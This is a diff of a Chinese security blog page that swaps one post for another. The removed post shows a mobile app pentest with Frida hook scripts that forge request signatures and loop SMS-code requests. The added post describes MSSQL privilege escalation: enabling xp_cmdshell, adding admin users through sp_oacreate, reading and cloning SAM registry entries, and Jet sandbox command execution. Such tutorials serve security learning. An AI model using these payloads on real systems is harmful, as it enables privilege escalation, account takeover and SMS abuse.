@@ -4,12 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一些真实的app渗透与算法hook, wa1ki0g,blog,github">
-    <meta name="description" content="app1apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面
-
-真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：
-
-我们放到burp重发器里，改参数重发，不出意外，果然做了签名校验不让改包">
+    <meta name="keywords" content="SqlServer常见攻击手法, wa1ki0g,blog,github">
+    <meta name="description" content="一些基础：Mssql是什么：
+mssql的英文全称是Microsoft SQL Server，一般简称MS-SQL或SQL Server；它是指微软的SQLServer数据库服务器，是一个关系型数据库管理系统。
+mssql的用户权限Mssq">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>一些真实的app渗透与算法hook | wa1ki0g‘s blog</title>
+    <title>SqlServer常见攻击手法 | wa1ki0g‘s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -262,12 +260,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">一些真实的app渗透与算法hook</h1>
+                    <h1 class="description center-align post-title">SqlServer常见攻击手法</h1>
                 </div>
             </div>
         </div>
@@ -395,28 +393,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-09-25
+                    2022-08-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-09-25
+                    2022-10-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    619
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -431,90 +429,34 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h2><p>apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面</p>
-<p><img src="https://img-blog.csdnimg.cn/b90abb0a24e34fe49de4bb453977e318.png" alt="在这里插入图片描述"></p>
-<p>真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：</p>
-<p><img src="https://img-blog.csdnimg.cn/893631dc91954b62a5ba243e9baa1e71.png" alt="在这里插入图片描述"></p>
-<p>我们放到burp重发器里，改参数重发，不出意外，果然做了签名校验不让改包：</p>
-<p><img src="https://img-blog.csdnimg.cn/f9390f59dbe040919f05247545021bd8.png" alt="在这里插入图片描述"><br>ok，逆一下这个apk，找到算法hook掉就好了，定位一下特征：</p>
-<p><img src="https://img-blog.csdnimg.cn/eb8ce964d9b949acad50ca6a7576f26a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c5644413da8f4a608d70ec23bf6291db.png" alt="在这里插入图片描述"><br>这个函数是发送请求的一个函数，我们观察一下这段代码，可以看到我们最终发出去的sign参数的组成是：（时间 + 类型 + 未知字符 + 手机号），并且这个未知字符是这个函数的一个参数，那好办了。<br>直接hook这个getSmscode函数，看看传来了哪些值，就可以得到这个未知字符，有了这个未知字符我们就可以构建sign</p>
-<p>真机开下frida服务端，做一下端口转发：<br><img src="https://img-blog.csdnimg.cn/6ceb6cb1ac2c4209a4f2b9cb91322eca.png" alt="在这里插入图片描述"></p>
-<p>hook代码：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> sys
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./bk.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<pre class=" language-javascript"><code class="language-javascript">Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.CommAction'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getSmscode<span class="token punctuation">.</span>implementation<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">{</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hook success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"type："</span><span class="token operator">+</span>aa<span class="token punctuation">,</span><span class="token string">"key："</span><span class="token operator">+</span>bb<span class="token punctuation">,</span><span class="token string">"phone："</span><span class="token operator">+</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSmscode</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>hook代码执行监听，手机重新发注册的包，成功监控到：<br><img src="https://img-blog.csdnimg.cn/10954ffaa97c4cb4b513b05c7b5c1868.png" alt="在这里插入图片描述"><br>未知字符找到了，我们用getStringMD5toUpperCase(yyyyMMddHHmmss + i + str + str2) 自己先算一组数据验证下，没有错误：</p>
-<p><img src="https://img-blog.csdnimg.cn/56aab381936e41a2841e6e76eef91eb6.png" alt="在这里插入图片描述"></p>
-<p>这回函数需要的参数我们都拥有了，我们直接通过frida的rpc来调用这个函数，直接给我们生成sign , 并简单写个发送请求的脚本，直接实现一条龙。<br>hook代码：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> datetime
-<span class="token keyword">import</span> requests
-url <span class="token operator">=</span> <span class="token string">'http://xxxxxx/Appapi/Common/getSmscode'</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-phone <span class="token operator">=</span> <span class="token string">'15149029981'</span>
-type1 <span class="token operator">=</span> <span class="token string">'1'</span>
-
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
-
-
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./demo1.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    curr_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    timestamp<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>curr_time<span class="token punctuation">,</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span>
-    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-    sign <span class="token operator">=</span> script<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>getsign<span class="token punctuation">(</span>f<span class="token string">'{timestamp}{type1}wocaonima{phone}'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>sign<span class="token punctuation">)</span>
-    dd <span class="token operator">=</span> <span class="token string">'"phone":"{0}","sign":"{1}","currTime":"{2}","type":"1"'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>phone<span class="token punctuation">,</span>sign<span class="token punctuation">,</span>timestamp<span class="token punctuation">)</span>
-    nd <span class="token operator">=</span> <span class="token string">'{'</span><span class="token operator">+</span>dd<span class="token operator">+</span><span class="token string">'}'</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hook success:'</span><span class="token operator">+</span>nd<span class="token punctuation">)</span>
-    userjson<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'userjson'</span><span class="token punctuation">:</span>nd<span class="token punctuation">}</span>
-  
-    talk <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>userjson<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"发送成功"</span><span class="token punctuation">)</span>
-</code></pre>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sign</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-    Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        res <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.network.HttpUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStringMD5toUpperCase</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token punctuation">}</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> res
-<span class="token punctuation">}</span>
-
-rpc<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">{</span>
-    getsign<span class="token punctuation">:</span>sign
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-</code></pre>
-<p><strong>第一个漏洞：验证码爆破</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/843a852697fc4eb287a0e1456b57f2f7.png" alt="在这里插入图片描述"></p>
-<p>结果：<br><img src="https://img-blog.csdnimg.cn/536b42d99f384d728859d4623a0cf542.png" alt="在这里插入图片描述"></p>
-<p><strong>第二个漏洞：任意用户密码重置</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/395bd1b23d8d4504b1d0a09549309d6c.png" alt="在这里插入图片描述"></p>
-<p><strong>第三个漏洞：任意用户注册与手机绑定</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/be1a0ae8f4a943d096a663a17e1f53b3.png" alt="在这里插入图片描述"></p>
-<p><strong>第四个漏洞：任意文件上传</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/012f1a46ffce44da8523a2f9ceaa4bc2.png" alt="在这里插入图片描述"></p>
+                <h2 id="一些基础："><a href="#一些基础：" class="headerlink" title="一些基础："></a>一些基础：</h2><p><strong>Mssql是什么：</strong></p>
+<p>mssql的英文全称是Microsoft SQL Server，一般简称MS-SQL或SQL Server；它是指微软的SQLServer数据库服务器，是一个关系型数据库管理系统。</p>
+<p><strong>mssql的用户权限</strong><br>Mssql数据库是可以选择以windows用户密码进行登录的<br><img src="https://img-blog.csdnimg.cn/2680b5d9a62945a082af2c4c01590095.png"><br><strong>数据库角色的成员可以分为如下几类：</strong></p>
+<p>Windows用户组或用户账户<br>SQL Server登录<br>其他角色</p>
+<p><strong>说    明</strong><br>sysadmin    执行SQL Server中的任何动作<br>serveradmin    配置服务器设置<br>setupadmin    安装复制和管理扩展过程<br>securityadmin    管理登录和CREATE DATABASE的权限以及阅读审计<br>processadmin    管理SQL Server进程<br>dbcreator    创建和修改数据库diskadmin    管理磁盘文件</p>
+<p><strong>Sa用户</strong></p>
+<p>sa用户是系统管理员的登录。Sa用户具有所有可能的关于系统管理工作的权限。在SQL Server 2005中，sa登录保持了向后兼容性。sa登录永远是固定服务器角色syadmin中的成员，并且不能从该角色中删除。</p>
+<p><strong>Mssql端口：1433</strong><br><strong>储存过程：</strong><br>存储过程 Procedure 是一组为了完成特定功能的 SQL 语句集合，经编译后存储在数据库中，用户通过指定存储过程的名称并给出参数来执行。<br>存储过程中可以包含逻辑控制语句和数据操纵语句，它可以接受参数、输出参数、返回单个或多个结果集以及返回值。</p>
+<p>Sqlserver的提权主要依赖其的储存过程</p>
+<p><strong>储存过程主要分为三类：</strong><br>1系统存储过程主要存储在master数据库中，以sp_为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名；<br>2扩展存储过程则是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以xp_为前缀，使用方法与系统存储过程类似；<br>3用户定义的存储过程是SQLServer的使用者编写的存储过程。</p>
+<p><strong>Sqlserver的权限：</strong><br>Sqlserver在windows服务中的权限是不小的，在Windows server类的操作系统上，默认具有system权限，所以我们才会通过Sqlserver执行命令，来进行提权操作</p>
+<h2 id="xp-cmd提权："><a href="#xp-cmd提权：" class="headerlink" title="xp_cmd提权："></a>xp_cmd提权：</h2><p><strong>xp_cmdshell</strong>：<br>它是可以用来执行系统命令的，但该组件默认是关闭的。因此需要把它打开。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它<br>Exec：执行存储过程：如 EXEC SP_XXX<br>Econfigure：更新保存配置<br>sp_configure储存过程可显示或更改当前服务器的全局配置设置</p>
+<p><strong>开启xp_cmd扩展功能：</strong><br>use master;<br>exec sp_configure ‘show advanced options’,1;<br>reconfigure;<br>exec sp_configure ‘xp_cmdshell’,1;<br>reconfigure;</p>
+<p><img src="https://img-blog.csdnimg.cn/bd97a5d9e492464884d82400a32280c4.png"><br><img src="https://img-blog.csdnimg.cn/968cde1e75f54db6b1db5e1963399564.png"></p>
+<p>如果xp_cmdshell被删除，上传xplog70.dll可恢复:<br>exec master.sys.sp_addextendedproc ‘xp_cmdshell’, C:\xxxx\xplog70.dll</p>
+<h2 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权:"></a>sp_oacreate提权:</h2><p>spoacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合spoamethod 来写文件执行cmd，在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权</p>
+<p><strong>启用sp_oacreate:</strong><br>EXEC sp_configure ‘show advanced options’, 1;<br>RECONFIGURE WITH OVERRIDE;<br>EXEC sp_configure ‘Ole Automation Procedures’, 1;<br>RECONFIGURE WITH OVERRIDE;</p>
+<p><img src="https://img-blog.csdnimg.cn/dbc919db4f394ddca2b0e56a1559da66.png"></p>
+<p><strong>执行命令：</strong><br>declare @shell int;<br>exec sp_oacreate ‘wscript.shell’,@shell output;<br>exec sp_oamethod @shell,’run’,null,’c:\windows\system32\cmd.exe /c net user test test /add’;<br>exec sp_oamethod @shell,’run’,null,’c:\windows\system32\cmd.exe /c net localgroup administrators test /add’</p>
+<p><img src="https://img-blog.csdnimg.cn/808686b8d23043ff9c5f637876130d7c.png"><br><img src="https://img-blog.csdnimg.cn/109afd6b211d4bdd9b1ebc9033f4b784.png"></p>
+<h2 id="xp-regread-与-xp-regwrite提权："><a href="#xp-regread-与-xp-regwrite提权：" class="headerlink" title="xp_regread 与 xp_regwrite提权："></a>xp_regread 与 xp_regwrite提权：</h2><p>xp_regread 与 xp_regwrite是可以直接访问我们的注册表的，（注册表是windows系统中的一个重要的数据库“注册表即Registry是Windows系统中的一个重要的数据库，用于存储系统和应用程序的设置信息；其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。 ）这样的话我们就可以通过修改注册表，来对目标机器的账户进行克隆。</p>
+<p><strong>Administrator密码：</strong><br><img src="https://img-blog.csdnimg.cn/84c9a6ff3480452e81005d78ae353ea2.png"><br><strong>获取administrator的加密密码:</strong><br>xp_regread ‘HKEY_LOCAL_MACHINE’,’SAM\SAM\Domains\Account\Users\000001F4’,’F’;</p>
+<p><img src="https://img-blog.csdnimg.cn/bb5ba667ad3b40d1b35611d4cc373762.png"><br><strong>将administrator用户的配置给gu覆盖到guest账号：</strong> xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SAM\SAM\Domains\Account\Users\000001F5’,’F’,’reg_binary’,0x02000100000000007534DD020BBBD00100000000000000008F0DDDB07DD3D80100000000000000000000000000000000F401000001020000110200000000000000000100010000000000000000000000;</p>
+<p><img src="https://img-blog.csdnimg.cn/f5f848dc4c954556b3c69b2e9d695a52.png"></p>
+<h2 id="沙盒提权："><a href="#沙盒提权：" class="headerlink" title="沙盒提权："></a>沙盒提权：</h2><p> 1，access可以调用VBS的函数，以System权限执行任意命令<br> 2，Access执行这个命令是有条件的，需要一个开关被打开<br> 3，这个开关在注册表里<br> 4，SA是有权限写注册表的<br> 5，用SA写注册表的权限打开那个开关<br> 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令</p>
+<p><strong>Payload:</strong><br><strong>激活沙盒模式1：</strong><br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;–</p>
+<p><strong>激活沙盒模式2：</strong><br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Wow6432Node\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;</p>
+<p><strong>执行命令：</strong><br>select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,‘;Database=c:\windows\system32\ias\ias.mdb’,‘select shell(“net user &gt;c:\1.txt “)’);</p>
 
                 
             </div>
@@ -541,7 +483,7 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/</a>
+                    <a href="http://example.com/2022/08/31/SqlServer%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">http://example.com/2022/08/31/SqlServer%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -748,10 +690,9 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
                 <a href="/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">
                     <div class="card-image">
@@ -769,9 +710,9 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -780,7 +721,6 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -791,13 +731,13 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/08/31/SqlServer%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">
+                <a href="/2022/08/06/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87LSA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="SqlServer常见攻击手法">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="域渗透——绕过LSA保护机制总结">
                         
-                        <span class="card-title">SqlServer常见攻击手法</span>
+                        <span class="card-title">域渗透——绕过LSA保护机制总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -808,7 +748,7 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-06
                             </span>
                         <span class="publish-author">
                             
